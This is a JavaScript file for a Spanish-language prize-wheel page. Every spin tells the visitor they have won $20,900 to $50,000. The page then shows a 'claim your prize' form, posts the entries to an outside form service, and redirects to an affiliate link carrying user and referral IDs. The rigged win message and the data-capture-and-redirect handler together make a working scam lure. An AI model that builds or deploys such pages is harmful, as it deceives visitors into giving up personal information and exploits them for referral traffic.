const wheel = document.getElementById('wheel');
const spinBtn = document.getElementById('spinBtn');
const result = document.getElementById('result');
const gameSection = document.getElementById('game-section');
const formSection = document.getElementById('form-section');
const prizeMessage = document.getElementById('prizeMessage');
const hiddenPrize = document.getElementById('hiddenPrize');

let isSpinning = false;

// Random prize between $20,900 and $50,000
function getRandomPrize() {
  const min = 20900;
  const max = 50000;
  const amount = Math.floor(Math.random() * (max - min + 1)) + min;
  return amount.toLocaleString('en-US');
}

spinBtn.addEventListener('click', () => {
  if (isSpinning) return;

  isSpinning = true;
  spinBtn.disabled = true;
  result.textContent = "Girando...";

  wheel.classList.add('spinning');

  setTimeout(() => {
    wheel.classList.remove('spinning');

    const prizeAmount = getRandomPrize();
    const prizeText = `$${prizeAmount}`;

    result.innerHTML = `¡FELICIDADES! GANASTE ${prizeText} 🎉<br>Redirigiendo al formulario...`;

    prizeMessage.innerHTML = `¡GANASTE ${prizeText}!<br>Completa los 3 campos para reclamar tu premio.`;
    hiddenPrize.value = `Ganaste ${prizeText}`;

    setTimeout(() => {
      gameSection.style.display = 'none';
      formSection.style.display = 'block';
      isSpinning = false;
      spinBtn.disabled = false;
    }, 1800);

  }, 4000);
});

// Form submission → send to Formspree → redirect
document.getElementById('claimForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const form = e.target;
  const submitBtn = document.getElementById('submitBtn');
  submitBtn.disabled = true;
  submitBtn.textContent = "Enviando...";

  fetch(form.action, {
    method: 'POST',
    body: new FormData(form),
    headers: { 'Accept': 'application/json' }
  })
  .then(response => {
    if (response.ok) {
      window.location.href = "https://www.latgree.com/?user=27977&ref=44947";
    } else {
      alert("Error al enviar. Inténtalo de nuevo.");
      submitBtn.disabled = false;
      submitBtn.textContent = "Reclamar Premio";
    }
  })
  .catch(() => {
    alert("Problema de conexión.");
    submitBtn.disabled = false;
    submitBtn.textContent = "Reclamar Premio";
  });
});
